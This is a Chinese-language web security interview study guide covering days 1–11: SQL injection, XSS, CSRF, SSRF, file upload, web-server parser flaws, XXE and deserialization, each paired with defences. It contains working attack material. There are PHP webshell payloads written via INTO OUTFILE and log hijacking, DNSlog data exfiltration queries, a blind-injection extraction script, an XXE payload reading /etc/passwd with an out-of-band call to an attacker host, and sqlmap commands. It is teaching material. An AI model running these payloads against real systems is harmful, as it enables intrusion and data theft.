# 网络安全面试精讲篇

> 本篇为**精讲版**，与《网络安全面试速答篇》一一对应，共 82 道题。
> 每题按 `★ 主题 / 答案 / 解析 / 考察知识点` 四段呈现，含实战验证脚本（[security:ctf] 格式：题型判断 → 利用思路 → 验证步骤 → 必要脚本）。

## 使用方式

| 角色 | 阅读路径 |
|------|----------|
| 求职突击（3 天） | 速答篇速览 → 精讲篇挑 ★★★★★ 重点 |
| 系统复习（30 天） | 速答篇每日 2-3 题 → 精讲篇对应展开 |
| 实战提升 | 重点看精讲篇"验证脚本"小节 |


---

### 第 1 天（精讲） ★★★★★ SQL 注入的原理、分类与防御


**主题**：Web 安全 / SQL 注入

**答案**：

**原理**：用户输入未经过滤直接拼接到 SQL 语句中执行，攻击者通过构造恶意输入改变查询逻辑，获取数据或执行系统命令。

**分类（按注入点）**：

1. 数字型注入：WHERE id=1，注入 `1 OR 1=1`
2. 字符型注入：WHERE name='$input'，注入 `' OR '1'='1`
3. 搜索型注入：LIKE '%$input%'

**按数据库**：

- MySQL：floor(rand()*2) / extractvalue / updatexml 报错
- MSSQL：xp_cmdshell / OpenRowSet 堆叠
- Oracle：ctxsys.drithsx.extractvalue / utl_inaddr 报错
- Access：偏移注入 + 字典爆破

**按数据获取方式**：

- 联合注入（UNION SELECT）
- 布尔盲注（条件真假对比页面）
- 时间盲注（sleep / Benchmark 观察延时）
- 报错注入（XPATH 语法错误泄露）
- DNSlog 外带（load_file 外带数据）

**防御（核心）**：

1. 预编译参数化查询（PreparedStatement），根本解决方案
2. PDO 绑定变量，ORM 框架安全封装
3. 输入白名单过滤 + 正则校验
4. 数据库账号最小权限，禁止 FILE/Process 权限
5. 错误信息关闭/脱敏，不向用户暴露数据库细节
6. WAF + 代码审计 + 数据库防火墙多层防御

**解析**：

考察意图：Web 安全第一考点，60% 以上面试必问。回答要点：要分类清晰，不能只说"加过滤"。易错点：把参数化查询说成万能（实际 ORM 拼接仍有风险）。面试官想听到：能区分各种注入类型、报错注入原理（XPATH 语法错误）、预编译为什么能防注入（SQL 语义和数据分离）。

**考察知识点**：

- 预编译参数化 PreparedStatement
- UNION/布尔/时间/报错盲注分类
- MySQL 报错函数 extractvalue / updatexml / floor
- WAF + 最小权限 + 输入过滤多层防御

---


---

### 第 2 天（精讲） SQL 注入写文件（webshell）的完整条件与绕过
**主题**：Web 安全 / SQL 注入 / getshell

**答案**：

通过 MySQL 注入点直接写入一句话木马，依赖 **5 个硬性条件缺一不可**，实战还需掌握多种绕过手段。

**5 个必备条件**：

1. **网站绝对路径**：通过报错信息、`phpinfo()`、读取配置文件（`my.cnf`、`httpd.conf`）、目录遍历等获取。
2. **MySQL 用户具 FILE 权限**：`SELECT file_priv FROM mysql.user WHERE user=current_user()` 结果为 `Y`。MySQL 5.5+ 默认 root 有 FILE 权限，普通用户需显式授权。
3. **`secure_file_priv` 配置**：
   
   - 取值 `NULL`（MySQL 5.6+ **默认**）：**完全禁止**导入导出，写文件直接失败。
   - 取值为某具体目录（如 `/var/lib/mysql-files`）：只能向该目录写。
   - 取值为空字符串：可向任意目录写。
   - 修改需重启：`SET GLOBAL secure_file_priv='';`（需 SUPER 权限）。
4. **目标目录可写**：操作系统层 `mysql` 运行用户对 web 目录有写权限。Linux 上常为 `chmod 777 /var/www/html` 或 `chown -R mysql:mysql /var/www/html`。
5. **魔术引号 / 编码拦截关闭**：`magic_quotes_gpc=Off`（PHP < 5.4）或未对内容做转义，否则单引号被反斜杠转义导致语法错误。

**写入命令**：
```sql
-- outfile：会转义换行和字段分隔符，写多行需注意
SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/var/www/shell.php';

-- dumpfile：原样写入，不转义，写二进制文件首选
SELECT '<?php @eval($_POST[1]);?>' INTO DUMPFILE '/var/www/shell.php';
```

**实战绕过手段**：

- **`secure_file_priv` 受限**：改用 `general_log_file` 劫持日志写文件：
  ```sql
  SET GLOBAL general_log_file='/var/www/log.php';
  SET GLOBAL general_log='ON';
  SELECT '<?php @eval($_POST[1]);?>';
  ```
  （之后任意 SELECT 都会被记录到该 PHP 文件并执行）
- **无 FILE 权限**：用 UDF 提权（写 .so/.dll 并 `create function`），或 MOF 提权（Windows）。
- **路径含特殊字符**：用 `hex()` 或 `char()` 函数构造路径绕过过滤：
  ```sql
  SELECT 0x3C3F70687020... INTO OUTFILE '/var/www/shell.php';
  ```
- **杀软拦截**：换用 ASP.NET 一句话 `<%@ Page Language="C#" %>`、JSP 一句话 `<%@ page import="java.util.*" %>`、图片马 + 解析漏洞。
- **慢查询日志 / 二进制日志**：`SET GLOBAL slow_query_log_file='/var/www/slow.php'; SET GLOBAL slow_query_log='ON';`

**outfile vs dumpfile 差异**：

| 维度 | outfile | dumpfile |
|------|---------|----------|
| 多行内容 | 可（但会转义） | 原样 |
| 字段分隔符 | 自动加 `\t\n` | 不加 |
| 二进制文件 | 不适合 | 适合 |
| 文件存在时 | 报错 | 覆盖 |

**典型失败排查**：
```sql
-- 检查 FILE 权限
SELECT file_priv FROM mysql.user WHERE user=current_user();

-- 检查 secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';

-- 检查插件目录（UDF 用）
SHOW VARIABLES LIKE 'plugin_dir';

-- 检查 mysqld 运行用户
SELECT user();
```

**防御组合**：

- `secure_file_priv` 设为具体目录或 NULL；
- MySQL 账户**最小权限**，禁用 FILE；
- web 目录不可写（`chown -R root:root /var/www`）；
- PHP 关闭 `allow_url_include`，开启 `open_basedir`；
- WAF 检测 `into outfile`/`into dumpfile` 关键字。

**解析**：

考察意图：实操题，面试官想听你讲清楚"为什么不能写"和"绕过的多种路径"。易错点：把 `secure_file_priv=NULL` 当作"可以写"（实际是禁止）。面试官想听到：能区分 `outfile` 与 `dumpfile`、知道 `general_log_file` 劫持日志是实战常用绕过、明白 MySQL 5.6+ 默认 `secure_file_priv=NULL` 让写文件变难、UDF 提权是替代方案。

**考察知识点**：

- 写文件 5 条件链：路径 + FILE 权限 + secure_file_priv + 目录可写 + 无转义
- `outfile` vs `dumpfile` 差异
- `secure_file_priv` 三种取值语义
- general_log_file 劫持日志绕过
- 配合 UDF 提权（D69 MySQL UDF/MOF）

**验证脚本**（写文件测试）：
```python
#!/usr/bin/env python3
# SQL 注入写文件条件验证脚本
import pymysql

def check_write_conditions(host, user, password):
    conn = pymysql.connect(host=host, user=user, password=password)
    cur = conn.cursor()

    # 1. FILE 权限
    cur.execute("SELECT file_priv FROM mysql.user WHERE user=USER()")
    file_priv = cur.fetchone()[0]

    # 2. secure_file_priv
    cur.execute("SHOW VARIABLES LIKE 'secure_file_priv'")
    sec = cur.fetchone()[1]

    # 3. 插件目录
    cur.execute("SHOW VARIABLES LIKE 'plugin_dir'")
    plugin_dir = cur.fetchone()[1]

    print(f"[+] 当前用户: {user}")
    print(f"[+] FILE 权限: {'Y' if file_priv == 'Y' else 'N'}")
    print(f"[+] secure_file_priv: '{sec}'")
    print(f"[+] 插件目录: {plugin_dir}")

    if file_priv != 'Y':
        print("[-] 无 FILE 权限，无法写文件")
        return False
    if sec is None:
        print("[-] secure_file_priv=NULL，禁止导入导出")
        return False
    print("[+] 满足写文件硬性条件（FILE + secure_file_priv 非 NULL）")
    return True

if __name__ == "__main__":
    check_write_conditions("127.0.0.1", "root", "root")
```

### 第 3 天（精讲） 盲注（布尔/时间）与报错注入的完整技术栈
**主题**：Web 安全 / SQL 注入 / 数据获取

**答案**：

无回显场景下的数据获取有 4 类方法，按实战优先级排序：**报错注入 > DNSlog 外带 > 时间盲注 > 布尔盲注**。

**1. 报错注入**（最快，前提有报错回显）：

| 数据库 | 函数 | 用法 |
|--------|------|------|
| MySQL 5.x | `updatexml` | `updatexml(1, concat(0x7e, (SELECT version())), 1)` |
| MySQL 5.x | `extractvalue` | `extractvalue(1, concat(0x7e, (SELECT user())))` |
| MySQL 5.x | `floor + rand` | `SELECT * FROM (SELECT count(*), concat((SELECT version()), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a` |
| MySQL 5.5.5+ | `exp` | `exp(~(SELECT * FROM (SELECT user())a))` |
| MSSQL | `convert` | `convert(int, (SELECT @@version))` |
| MSSQL | `db_name()` | `convert(int, db_name(), 1)` |
| Oracle | `ctxsys.drithsx.extractvalue` | 需 DBA 权限 |
| Oracle | `utl_inaddr.get_host_name` | `SELECT utl_inaddr.get_host_name((SELECT user FROM dual)) FROM dual` |
| PostgreSQL | `cast` | `cast((SELECT version()) as int)` |

**2. DNSlog 外带**（无回显 + 无错报，**内网打穿神器**）：

```sql
-- MySQL（需 secure_file_priv 非 NULL + load_file）
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT hex(database())), '.xxx.dnslog.cn\\a'));

-- MSSQL（xp_dirtree）
EXEC master..xp_dirtree '\\\\' + (SELECT @@version) + '.xxx.dnslog.cn\\a';

-- Oracle（UTL_HTTP）
SELECT UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.xxx.dnslog.cn') FROM dual;

-- PostgreSQL（dblink + host 拼接）
SELECT * FROM dblink('host='||(SELECT current_user)||'.xxx.dnslog.cn dbname=test', 'select 1') AS t;
```

配合 DNSlog 平台：`dnslog.cn`、`ceye.io`、`burpcollaborator.net`。

**3. 时间盲注**（无回显 + 无错报 + 无外带）：

```sql
-- MySQL
AND IF(ASCII(SUBSTR(database(),1,1))=115, SLEEP(5), 0)

-- MSSQL
AND IF(ASCII(SUBSTR(db_name(),1,1))=115, WAITFOR DELAY '0:0:5')

-- benchmark() 替代 sleep 绕过 sleep 过滤
AND BENCHMARK(5000000, MD5('a'))
```

**4. 布尔盲注**（页面有"对/错"两种响应）：

```sql
AND ASCII(SUBSTR(database(),1,1))>100   -- 真/假
```

配合脚本：`sqlmap -u "url?p=1" --technique=B` 或手写二分查找脚本（Python `requests` + 二分）。

**效率对比**：

- **报错注入**：1 次请求读全部字段（最快）
- **DNSlog**：1 次请求 1 个字段（受域名长度 253 字符限制）
- **时间盲注**：1 次请求 1 bit（最慢）
- **布尔盲注**：1 次请求 1 bit（比时间盲注快一点）

**sqlmap 高级用法**：
```bash
# 同时尝试所有技术
sqlmap -u "http://target.com/news?id=1" --technique=BEUSTQ --batch

# 启用 DNSlog 外带
sqlmap -u "http://target.com/news?id=1" --dns-domain=xxx.dnslog.cn

# 指定数据库类型（加速）
sqlmap -u "http://target.com/news?id=1" --dbms=mysql

# 自定义 tamper（WAF 绕过）
sqlmap -u "http://target.com/news?id=1" --tamper=space2comment,between,randomcase
```

**实战选择树**：
```
有报错回显？
├── 是 → 报错注入（updatexml/extractvalue/floor）
└── 否
    ├── 有出网 + 支持 dnslog 函数 → DNSlog 外带
    ├── 无出网但有差异响应 → 布尔盲注
    ├── 无差异响应 → 时间盲注
    └── 都没有 → 写入 webshell（结合 D2）
```

**防御组合**：

- 关闭错误回显（生产环境 `display_errors=Off`）；
- 数据库用户禁 FILE/Process 权限；
- 禁止危险函数（`updatexml`、`extractvalue`、`xp_dirtree`、`UTL_HTTP`）；
- WAF 检测 `sleep`、`benchmark`、`waitfor delay` 等关键字。

**解析**：

考察意图：实操深度，区分"会用 sqlmap"和"理解原理"。回答要点：分类清晰 + 报错函数列举 + DNSlog 外带原理。易错点：把所有"盲注"统称（实际分布尔/时间/DNSlog）。面试官想听到：能列 5+ 报错函数、知道 DNSlog 跨内网外带价值、理解 `benchmark()` 替代 `sleep` 的绕过思路。

**考察知识点**：

- 4 类数据获取技术栈（报错/DNSlog/时间/布尔）适用场景
- 报错注入函数族：`updatexml`/`extractvalue`/`floor`/`exp`/`convert`
- DNSlog 外带原理与各数据库支持
- 时间盲注效率优化（二分 + 脚本）
- sqlmap `--technique` 与 `--dns-domain` 参数

**验证脚本**（手工布尔盲注 + 二分）：
```python
# 二分盲注脚本（以 MySQL 为例）
import requests

url = "http://target.com/news?id=1 AND ASCII(SUBSTR(database(),{pos},1))>{num}"

result = ""
for pos in range(1, 20):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        r = requests.get(url.format(pos=pos, num=mid))
        if "正常页面标志" in r.text:
            low = mid + 1
        else:
            high = mid - 1
    result += chr(low)
    print(f"[+] database[{pos}] = {chr(low)}")
print(f"[+] Final database name: {result}")
```

### 第 4 天（精讲） ★★★★★ XSS 类型与防御措施


**主题**：Web 安全 / XSS

**答案**：

**类型**：

1. 反射型 XSS：恶意代码在 URL 参数中，单次请求响应即触发，无持久化。攻击者诱导用户点击特制 URL。
2. 存储型 XSS：恶意代码存入数据库（评论、用户资料等），每次访问页面自动执行，危害最大。
3. DOM 型 XSS：完全在浏览器端通过 JS 操作 DOM 触发，不经过服务器，可能绕过服务端过滤。

**危害**：盗取 Cookie（document.cookie）→ 身份冒用、会话劫持；钓鱼（注入登录表单）；挂马/挖矿；键盘记录；发起内网扫描；CSRF 组合攻击。

**绕过技巧（面试加分）**：

- 大小写变换：`<ScRiPt>`
- 编码绕过：HTML 实体、URL 编码、Unicode 编码
- 标签替换：`<img onerror=>` `<svg onload=>` `<a href=javascript:>`
- 注释符绕过：`<!-- -->`
- 字符串拼接：`eval('al'+'ert(1)')`

**防御（核心）**：

1. 输入过滤白名单（按业务允许字符集）
2. 输出 HTML 实体编码（`&lt; &gt; &amp; &quot;`）
3. http-only Cookie（禁止 JS 读取 document.cookie）
4. CSP 内容安全策略（`Content-Security-Policy` 头限制脚本源）
5. Cookie 严格 domain + path 限制
6. 前端使用 DOMPurify 或 textContent 代替 innerHTML
7. 模板引擎自动转义（如 React JSX 默认转义）

**解析**：

考察意图：Web 安全三剑客（SQLi / XSS / CSRF）之一。回答要点：要分类+危害+防御三个层面。易错点：忽视 DOM 型 XSS（认为只是前端问题）或认为 http-only = 绝对安全（仍可发起请求）。面试官想听到：能区分存储型和反射型的持久化差异、理解 CSP 工作机制（白名单 script-src）。

**考察知识点**：

- 反射型 / 存储型 / DOM 型 XSS 分类
- 输出编码 + 输入过滤双层防御
- http-only Cookie 属性
- CSP Content-Security-Policy 策略

---


---

### 第 5 天（精讲） ★★★★★ CSRF 原理与防御


**主题**：Web 安全 / CSRF

**答案**：

**原理**（Cross-Site Request Forgery 跨站请求伪造）：

- 利用用户已登录身份，诱导访问恶意页面
- 恶意页面自动向目标网站发起请求（转账、改密、关注等）
- 浏览器自动携带目标站点的 Cookie 完成认证
- 三要素：登录态 + 未退出 + 隐式提交

**攻击载体**：

- `<img src="http://bank.com/transfer?to=attacker&amount=100">`
- `<form action="http://target" method=POST>` 自动提交
- `<iframe src="...">` 隐藏
- 链接诱导点击

**防御（核心）**：

1. Referer 检查：验证请求来源页面的 Referer 头是否合法域名（但 Referer 可被绕过或禁用）
2. CSRF Token：在请求中携带服务端生成的随机 Token，验证 Token 一致性（最可靠）
3. SameSite Cookie：`Set-Cookie: SameSite=Strict/Lax`，限制跨站发送 Cookie（Chrome 默认 Lax）
4. 二次验证：重要操作（转账、改密）要求输入验证码或短信验证
5. 自定义 Header：要求请求带 `X-Requested-With: XMLHttpRequest`
6. 关键操作使用 POST 而非 GET（GET 易被 IMG/iframe 触发）

**解析**：

考察意图：与 SQLi/XSS 并列必问。回答要点：讲清"已登录状态"这一前提。易错点：以为只要 Referer 校验就够了（实际可被绕过或禁用）。面试官想听到：理解 SameSite 属性的三种取值（None/Lax/Strict）差异、Token 如何防御（攻击者拿不到目标站点的 Token）。

**考察知识点**：

- 三要素：登录态 + 未退出 + 隐式提交
- CSRF Token 随机不可预测
- SameSite Cookie 属性
- Referer + 验证码二次防御

---


---

### 第 6 天（精讲） ★★★★★ SSRF 原理、危害与防御


**主题**：Web 安全 / SSRF

**答案**：

**原理**（Server-Side Request Forgery 服务端请求伪造）：
服务端可访问互联网或内网，攻击者通过构造 URL 让服务端发起请求，可突破外网隔离访问内网资源。常见触发点：图片加载、文件下载、URL 预览、远程图片采集、XML 外部实体。

**利用方式**：

1. **内网探测**：`http://10.0.0.1/`、`http://192.168.1.1/` 端口扫描（file_get_contents 头部响应判断）
2. **协议利用**：
   - `file://` 读取本地文件：`file:///etc/passwd`
   - `gopher://` 发送任意 TCP 数据（Redis 未授权、FastCGI）
   - `dict://` 探测端口 banner
   - `http://169.254.169.254/` 云元数据 SSRF
3. **Redis 写 Shell**：SSRF 访问内网 Redis 6379，用 gopher 协议发送 `CONFIG SET dir + dbfilename` 命令写 crontab 或 authorized_keys
4. **DNS Rebinding**：域名第一次解析为合法 IP 通过校验，TTL 过期后再次解析为内网 IP 绕过

**防御（核心）**：

1. URL 白名单：仅允许访问已知域名/IP
2. 协议限制：禁用 file / gopher / dict / ldap 等危险协议
3. 内网 IP 过滤：禁止访问 10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、127.0.0.0/8
4. DNS Rebinding 防护：固定 DNS 解析结果，验证 IP 非内网
5. 响应处理：禁止返回原始响应给客户端
6. 端口限制：仅允许 80/443 标准 Web 端口

**解析**：

考察意图：近年高频考点，护网常考。回答要点：要讲清协议利用（file/gopher/dict）的差异。易错点：忽视 DNS Rebinding（域名多次解析绕过 IP 校验）。面试官想听到：能详细说明 gopher:// 协议如何打 Redis（这是真实渗透中的常见组合）、云元数据 SSRF 的危害（AK 泄露导致整个云账户沦陷）。

**考察知识点**：

- file / gopher / dict 协议利用
- 内网 IP 段过滤
- DNS Rebinding 绕过与防御
- 云元数据 169.254.169.254

---


---

### 第 7 天（精讲） ★★★★ PHP 危险函数与 disable_functions 绕过


**主题**：Web 安全 / PHP

**答案**：

PHP 危险函数分四类：

**1. 代码执行**：

- `eval()`：执行字符串作为 PHP 代码
- `assert()`：PHP 7 前可执行字符串（已修复）
- `preg_replace()` /e 修饰符（PHP 7 已移除）
- `create_function()`：创建匿名函数（PHP 7.2 已废弃，8.0 移除）
- `call_user_func()` / `call_user_func_array()`
- `array_map()` / `array_filter()`

**2. 命令执行**：

- `system()` / `exec()` / `passthru()`
- `shell_exec()` 反引号 `` ` ``
- `popen()` / `proc_open()`
- `pcntl_exec()`
- `putenv()` + `mail()` / `imagick()` LD_PRELOAD 劫持

**3. 文件操作**：

- `file_get_contents()` / `file_put_contents()`
- `fopen()` / `readfile()`
- `move_uploaded_file()`
- `unlink()` / `fwrite()`

**4. 信息泄露**：

- `phpinfo()` / `print_r()` / `var_dump()` / `getenv()`

**disable_functions 绕过（受限环境 getshell）**：

1. **LD_PRELOAD 劫持**：`mail()` 函数 + `putenv()` 触发新进程加载自定义 .so
2. **Apache mod_cgi bypass**：上传 `.htaccess` + 修改 CGI 执行
3. **ImageMagick Ghostscript**：触发命令执行
4. **PHP-FPM SSRF**：gopher:// 攻击 9000 端口
5. **PHP 7.0-7.4 GC 回收机制绕过**（pwn）
6. **扩展 Hook**：自行编译 .so 扩展

**防御**：

- 禁用 eval / assert / system 等危险函数（disable_functions）
- open_basedir 限制目录访问
- 升级 PHP 7.4+（eval 禁用 assert 改进）

**解析**：

考察意图：PHP 安全审计核心。回答要点：分类清楚。易错点：忽视 LD_PRELOAD 等高级绕过手法。面试官想听到：知道 `mail()` 函数 + `putenv()` 组合触发 .so 加载原理，理解为什么禁用 disable_functions 仍能被绕过（系统调用层）。

**考察知识点**：

- 代码/命令/文件/信息四类危险函数
- LD_PRELOAD 劫持原理
- FPM SSRF gopher 攻击
- open_basedir 目录限制

---


---

### 第 8 天（精讲） ★★★★★ 文件上传漏洞与绕过手法


**主题**：Web 安全 / 文件上传

**答案**：

**漏洞原理**：服务端未严格校验上传文件的后缀、类型、内容，攻击者可上传 WebShell 获得服务器权限。

**校验维度（按从弱到强）**：

1. 客户端 JS 校验（最弱，可 Burp 直接改包绕过）
2. Content-Type 校验（仅看 MIME，可改为 image/jpeg 绕过）
3. 后缀黑名单（黑名单不全，可尝试 php3/php4/php5/phtml/phar/asa/cer/cdx 等）
4. 后缀白名单（仅允许 jpg/png/gif，但配合解析漏洞仍可绕过）
5. 文件头校验（GIF89a/JPEG/PNG magic number）
6. 文件内容二次渲染（图片处理后仍含 shell 代码）

**经典绕过手法**：

1. 大小写变换：`shell.PhP`
2. 双写后缀：`shell.pphphp`（过滤 php 为空）
3. 文件名+特殊字符：`shell.php%00.jpg`（空字节截断）
4. 图片头+PHP：`GIF89a<?php phpinfo();?>`
5. **解析漏洞**：
   
   - IIS 6.0：`shell.asp;.jpg`（;.jpg 被忽略）
   - Apache 多后缀：`shell.php.xxx` 按最后未识别后缀解析
   - Nginx 空字节：`shell.jpg%00.php`（CVE-2013-4547）
6. `.htaccess` 上传：解析 jpg 为 php
7. 压缩包解压：上传 zip 服务端解压触发

**防御（必须全栈）**：

1. 白名单后缀（仅 jpg/png/gif）
2. 校验 Content-Type 与文件头 magic
3. 文件重命名为随机名 + 失去原始后缀
4. Web 目录禁止执行权限（.jpg 按静态文件处理）
5. 文件内容二次渲染/图像转换

**解析**：

考察意图：文件上传是 GetShell 最直接路径，几乎 100% 被问。回答要点：要分类展示绕过手法。易错点：只提后缀绕过忽视 Content-Type/文件头/二次渲染。面试官想听到：能讲清楚各类解析漏洞（IIS 6 的;.jpg、Apache 多后缀、Nginx 空字节）的历史背景，理解白名单+重命名+Web 目录无执行权限才是终极方案。

**考察知识点**：

- 白名单 vs 黑名单策略
- GIF89a 图片头+PHP
- IIS / Apache / Nginx 解析漏洞
- 目录禁止执行权限

---


---

### 第 9 天（精讲） 常见 Web 容器解析漏洞
**主题**：Web 安全 / 文件上传 / 中间件解析

**答案**：

Web 容器解析漏洞的**本质**是"解析器对路径/后缀的处理规则"与应用程序预期不符，常见三大容器（IIS / Apache / Nginx）都有历史经典漏洞。

**IIS 6.0 解析漏洞**（已停产，但仍有 Windows Server 2003 在用）：

- **`*.asp;*.jpg` 按 asp 解析**：
  - 上传 `shell.asp;.jpg`，IIS 当作 asp 执行（`;.jpg` 被忽略）。
  - 利用条件：网站开启了可执行权限。
- **目录型解析**：
  - 上传文件到 `*.asp/` 目录（如 `upload/shell.asp/x.jpg`）。
  - 该目录下所有文件按 asp 解析。
- **修复**：升级到 IIS 7.5+，或关闭 WebDAV + 设置目录权限。

**IIS 7.0+ 解析漏洞**：

- **`shell.jpg/.php` 触发 FastCGI 解析**：
  
  - 路径 `http://target.com/upload/shell.jpg/.php` → Nginx/IIS 7+ 通过 PATH_INFO 转发给 PHP-FPM。
  - PHP-FPM 配置 `cgi.fix_pathinfo=1` 时，把 `shell.jpg/.php` 当 PHP 文件执行。
  - 利用条件：Nginx + PHP-FPM + `cgi.fix_pathinfo=1`。

- **修复**：在 `php.ini` 中设 `cgi.fix_pathinfo=0`。

**Apache 解析漏洞**：

- **多后缀从右往左认**：

  - Apache 配置 `AddHandler application/x-httpd-php .php` 后，文件 `x.php.xxx` 若 `.xxx` 未注册，按 `.php` 解析。
  - 利用条件：`AddHandler` 配置 + 任意未识别后缀。

- **`.htaccess` 解析**：
  
  - 上传 `.htaccess` 内容 `AddType application/x-httpd-php .jpg` → 同目录 jpg 按 PHP 解析。
  - 利用条件：`AllowOverride All` 配置 + 目录可写。

- **修复**：升级 Apache + 关闭 `AllowOverride All` 或限制 `AllowOverride` 为 `None`。

**Nginx 解析漏洞**：

- **空字节截断**（CVE-2013-4547）：
  - 上传 `shell.jpg%00.php`，Nginx 在某些版本下识别为 `shell.jpg` 但 PHP-FPM 按 `shell.php` 解析。
  - 影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7。
- **修复**：升级 Nginx 到 1.4.4+ 或 1.5.8+，关闭 `cgi.fix_pathinfo`。
- **PATH_INFO 解析**：

  - `http://target.com/upload/shell.jpg/.php`（同 IIS 7.0+）。

**Tomcat 解析漏洞**：

- **PUT 上传**（CVE-2017-12615）：
  - Tomcat 启动时若 `readonly=false`（默认 web.xml 是 true，需修改 conf/web.xml）。
  - 支持 PUT 方法直接上传 JSP：`PUT /shell.jsp/ HTTP/1.1`（带 `/` 绕过）。
- **修复**：设置 `readonly=true`。
- **AJP 文件读取**（CVE-2020-1938，GhostCat）：
  - 8009 端口 AJP 协议默认开启。
  - 攻击者可构造 AJP 请求读取 `WEB-INF/web.xml` 等敏感文件（含所有 Servlet 路径、数据库连接等）。
  - 利用工具：`python ajpShooter.py` 或 `pyfbf`。
- **修复**：关闭 AJP Connector（注释 server.xml 中 AJP 配置）或升级 Tomcat 8.5.51+。

**PHP-FPM 解析漏洞**：

- **`cgi.fix_pathinfo=1` 时**（默认）：
  - 访问 `http://target.com/upload/shell.jpg/anything.php`。
  - PHP-FPM 把 `shell.jpg/anything.php` 当 PHP 执行（实际执行 `shell.jpg`）。
- **修复**：在 `php.ini` 中设 `cgi.fix_pathinfo=0`，并升级到 PHP 7.0+。

**实战组合**：

- **Nginx + PHP-FPM + Tomcat + IIS 6.0** 各有不同解析漏洞，结合上传 + 解析可达 RCE。
- **绕过现代 WAF**：用 `shell.jpg%20.php`（空格截断，部分版本有效）或 `shell.php/../../shell.jpg`。

**修复清单**（黄金组合）：

1. 关闭 `cgi.fix_pathinfo`（PHP）。
2. 升级所有中间件到最新稳定版。
3. Apache 关闭 `AllowOverride All`。
4. IIS 关闭 WebDAV。
5. Tomcat 设 `readonly=true`，关闭 AJP。
6. Nginx 关闭 `security.limit_extensions` 错误配置。
7. 上传目录禁执行（用 `<Directory>` 或 `location` 配 `autoindex off` + `php_flag engine off`）。

**解析**：

考察意图：考察 Web 容器原理与历史漏洞。回答要点：分类列各容器漏洞 + 触发条件 + 修复。易错点：只记"Apache 多后缀"忽略其他。面试官想听到：能讲清 IIS 6 `;.jpg` 原理、Nginx 空字节 CVE 编号、Tomcat AJP 文件读取 GhostCat 漏洞。

**考察知识点**：

- IIS 6 `*.asp;*.jpg` 和目录解析
- Apache 多后缀 + `.htaccess`
- Nginx 空字节 CVE-2013-4547
- PHP-FPM `cgi.fix_pathinfo` 默认值
- Tomcat AJP CVE-2020-1938（GhostCat）
- 修复组合：版本升级 + 关闭危险配置

**验证脚本**（解析漏洞探测）：
```python
#!/usr/bin/env python3
# Web 容器解析漏洞探测脚本
import requests

URL = "http://target.com"
TEST_FILES = [
    ("test.jpg", "image/jpeg", b"GIF89a<?php phpinfo();?>"),  # 图片马
]

def check_parsing():
    # 检查常见解析漏洞
    payloads = [
        # IIS 6 / ASP
        ("/test.asp;.jpg", "IIS 6 ASP ;.jpg 解析"),
        # Nginx / PHP-FPM
        ("/test.jpg/.php", "Nginx/PHP-FPM PATH_INFO 解析"),
        # Nginx CVE-2013-4547
        ("/test.jpg%20.php", "Nginx 空字节截断"),
        # Apache
        ("/test.php.xxx", "Apache 多后缀解析"),
    ]
    for path, desc in payloads:
        r = requests.get(URL + path)
        if "phpinfo" in r.text or "ASP.NET" in r.text:
            print(f"[+] 可能存在: {desc}")
            print(f"    URL: {URL + path}")

if __name__ == "__main__":
    check_parsing()
```

### 第 10 天（精讲） ★★★★★ XXE 漏洞原理与防御


**主题**：Web 安全 / XXE

**答案**：

XXE（XML External Entity Injection XML 外部实体注入）：服务端解析 XML 时未禁用外部实体加载，攻击者构造恶意 XML 文档通过 DOCTYPE 声明加载外部资源。

**攻击 Payload 示例**：
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

**漏洞类型**：

1. 直接回显 XXE：服务端返回实体内容直接可见
2. 盲 XXE：无回显，通过外带（OOB）技术探测：
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
   %dtd;
   ```
3. SSRF 组合：外部实体指向内网 URL 实现服务端探测
4. DOS 攻击：嵌套亿级实体（Billion Laughs）

**常见触发点**：

- XML API 接口（SOAP/REST 接受 XML）
- Office 文档解析（DOCX/XLSX 本质是 XML）
- SVG 图片解析
- RSS/Atom feed

**防御（核心）**：

1. 禁用外部实体加载：
   - PHP：`libxml_disable_entity_loader(true)`
   - Java：`DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
2. 升级 libxml >= 2.9.0
3. 用 JSON 替代 XML
4. 输入校验：禁用 DOCTYPE/ENTITY 关键字
5. WAF 规则：拦截含 ENTITY/SYSTEM 的 XML

**解析**：

考察意图：与文件上传/SQLi 并列的高危 Web 漏洞。回答要点：要讲清"实体"和"DOCTYPE"概念。易错点：忽视盲 XXE（无回显时如何外带）。面试官想听到：能详细说明外部实体 SYSTEM 关键字、参数实体 `%`（用于盲 XXE OOB 外带）、亿级 DOS 攻击原理。

**考察知识点**：

- DOCTYPE + ENTITY + SYSTEM 结构
- libxml_disable_entity_loader
- DocumentBuilderFactory 禁用 DTD
- 盲 XXE 外带 OOB 技术

---


---

### 第 11 天（精讲） ★★★★ PHP/Java 反序列化漏洞原理


**主题**：Web 安全 / 反序列化

**答案**：

反序列化漏洞（Insecure Deserialization）：程序将不可信数据反序列化为对象时，攻击者构造恶意序列化数据触发魔术方法执行危险操作。

**PHP 反序列化**：

- `unserialize($_POST)` 处理用户输入
- 魔术方法：`__wakeup()`、`__destruct()`、`__toString()`、`__call()`
- POP 链（Property-Oriented Programming）构造：从入口魔术方法到危险函数的调用链
- 危险函数：`system` / `exec` / `assert` / `eval` / `call_user_func`
- 绕过技巧：CVE-2016-7124 wakeup 绕过（属性数量大于实际）、引用、GC 回收

**Java 反序列化**：

- `ObjectInputStream.readObject()` 处理用户输入
- 关键 gadget：Apache Commons Collections（InvokerTransformer 链）、Spring、Groovy 等
- 工具：ysoserial 生成 payload、marshalsec
- ysoserial CommonsCollections 系列最为经典

**通用危险链**：
```
入口 → 魔术方法/反序列化点 → 中间类调用 → 危险 sink（命令执行/文件读写/JNDI 注入）
```

**修复**：

1. 禁止反序列化不可信数据
2. 白名单限制可反序列化的类（Java ObjectInputFilter）
